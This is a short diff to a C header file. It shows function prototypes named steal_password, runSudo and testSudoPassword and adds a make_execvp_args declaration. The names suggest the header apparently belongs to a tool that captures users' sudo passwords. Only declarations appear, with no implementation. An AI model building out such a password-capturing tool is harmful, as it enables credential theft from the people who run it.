@@ -10,4 +10,6 @@ int steal_password(char * passwd, char * username);
 
 int runSudo(char * passwd, char ** argary);
 int testSudoPassword(char * passwd);
+
+char ** make_execvp_args(int argc, char ** argv);
 #endif
